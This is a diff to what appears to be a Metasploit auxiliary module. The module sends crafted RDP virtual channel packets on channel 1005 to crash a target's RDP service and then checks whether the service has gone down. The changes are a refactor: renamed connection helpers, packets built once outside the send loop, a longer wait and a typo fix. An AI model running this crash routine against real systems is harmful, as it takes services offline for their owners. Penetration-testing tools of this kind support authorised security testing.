@@ -72,8 +72,8 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def rdp_reachable
-    connect
-    disconnect
+    rdp_connect
+    rdp_disconnect
     return true
   rescue Rex::ConnectionRefused
     return false
@@ -140,7 +140,7 @@ class MetasploitModule < Msf::Auxiliary
       # the DoS to fail. Note that sometimes the DoS seems to fail. Increasing
       # the payload size and sending more of them doesn't seem to improve the
       # reliability. It *seems* to happen more often on x64, I haven't seen it
-      # fail against x86. Repleated attempts will generally trigger the DoS.
+      # fail against x86. Repeated attempts will generally trigger the DoS.
       x86_string += "FF" * 1
       x64_string += "FF" * 2
     else
@@ -148,24 +148,22 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # 0x03 = CHANNEL_FLAG_FIRST | CHANNEL_FLAG_LAST
-    x86_payload = build_virtual_channel_pdu(0x03, [x86_string].pack("H*"))
-    x64_payload = build_virtual_channel_pdu(0x03, [x64_string].pack("H*"))
+    x86_packet = rdp_build_pkt(build_virtual_channel_pdu(0x03, [x86_string].pack("H*")), "\x03\xed")
+    x64_packet = rdp_build_pkt(build_virtual_channel_pdu(0x03, [x64_string].pack("H*")), "\x03\xed")
 
     6.times do
       # 0xed03 = Channel 1005
-      x86_packet = rdp_build_pkt(x86_payload, "\x03\xed")
       rdp_send(x86_packet)
-      x64_packet = rdp_build_pkt(x64_payload, "\x03\xed")
       rdp_send(x64_packet)
 
       # A single pass should be sufficient to cause DoS
       if action.name == 'Crash'
         sleep(1)
-        disconnect
+        rdp_disconnect
 
-        sleep(1)
+        sleep(5)
         if rdp_reachable
-          print_error("Target doesn't appear to have been crashed.")
+          print_error("Target doesn't appear to have been crashed. Consider retrying.")
           return Exploit::CheckCode::Unknown
         else
           print_good("Target service appears to have been successfully crashed.")
